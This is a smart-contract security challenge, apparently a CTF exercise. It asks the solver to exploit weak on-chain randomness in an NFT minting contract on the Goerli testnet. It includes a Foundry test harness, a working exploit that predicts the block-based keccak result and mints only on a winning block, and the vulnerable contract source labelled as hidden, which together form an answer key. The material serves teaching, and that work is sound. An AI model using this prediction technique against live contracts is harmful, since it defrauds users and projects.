# Background
Before the Oracles, it was difficult to generate random numbers. People had to use `sha3(block.number)` or other built-in variables to simulate the randomness.

# The predictable NFT game
There is a web game, you can spend 1 ether to "mint" an NFT token, there're 3 possible ranks of it: Common(1), Rare(2), Superior(3).

As a hacker, you spot their weak randomness algorithm, you can predict the minting result and always mint the Superior ones, maybe sell them on the market to profit.

You find the underlying contract of this game, which is `0xFD3CbdbD9D1bBe0452eFB1d1BFFa94C8468A66fC` on **goerli testnet**, it isn't open source but who needs it anyway.

# The Goal
You have only 1 ether to mint 1 token, make sure mint a Superior one. You can wait and do it on the right block.

# Foundry setUp:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^ 0.8.19;

import "forge-std/Test.sol";

contract PredictableNFTTest is Test {
	address nft;

	address hacker = address(0x1234);

	function setUp() public {
		vm.createSelectFork("goerli");
		vm.deal(hacker, 1 ether);
		nft = address(0xFD3CbdbD9D1bBe0452eFB1d1BFFa94C8468A66fC);
	}

	function test() public {
		vm.startPrank(hacker);

		uint mintedId;

		uint currentBlockNum = block.number;

		// Mint a Superior one, do it within the next 100 blocks.
		for(uint i=0; i<100; i++) {
			vm.roll(currentBlockNum);

			// call the function `mint()` on the right block and break the loop
			// ---- hacking time ----

			// ---- end of hacking ----

			currentBlockNum++;
		}

		// get rank from `mapping(tokenId => rank)`
		(, bytes memory ret) = nft.call(abi.encodeWithSignature(
			"tokens(uint256)",
			mintedId
		));
		uint mintedRank = uint(bytes32(ret));
		assertEq(mintedRank, 3, "not Superior(rank != 3)");
	}
}

```


# Hint
1. Use the decompiler on "https://goerli.etherscan.io/address/0xFD3CbdbD9D1bBe0452eFB1d1BFFa94C8468A66fC#code"
2. In the decompilation result, `stor0` means "storage slot 0".


# Solution
The solution code that to be inserted at the `---- hacking time ----`:
```solidity
			(, bytes memory ret) = nft.call(abi.encodeWithSignature(
				"id()"
			));
			uint nextId = uint(bytes32(ret)) + 1;

			uint score = uint256(keccak256(abi.encode(
				nextId, hacker, currentBlockNum
			))) % 100;

			if(score > 90) {
				(, bytes memory ret) = nft.call{value: 1 ether}(abi.encodeWithSignature(
					"mint()"
				));
				mintedId = uint(bytes32(ret));
				break;
			}
```

# This should remain hidden, it's the underlying source code 
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^ 0.8.19;

contract PredictableNFT {
	uint public id;

	mapping(uint => uint) public tokens; // map of: tokenId => rank

	function mint() external payable returns(uint) {
		require(msg.value == 1 ether, "show me the money");

		id += 1;

		uint rank = random();

		tokens[id] = rank;

		return id;
	}

	function random() private view returns(uint) {
		uint randScore = uint256(keccak256(abi.encode(
			id, msg.sender, block.number
		))) % 100;

		if(randScore > 90) {
			return 3; // Superior
		} else if(randScore > 80) {
			return 2; // Rare
		} else {
			return 1; // Common
		}
	}
}
```
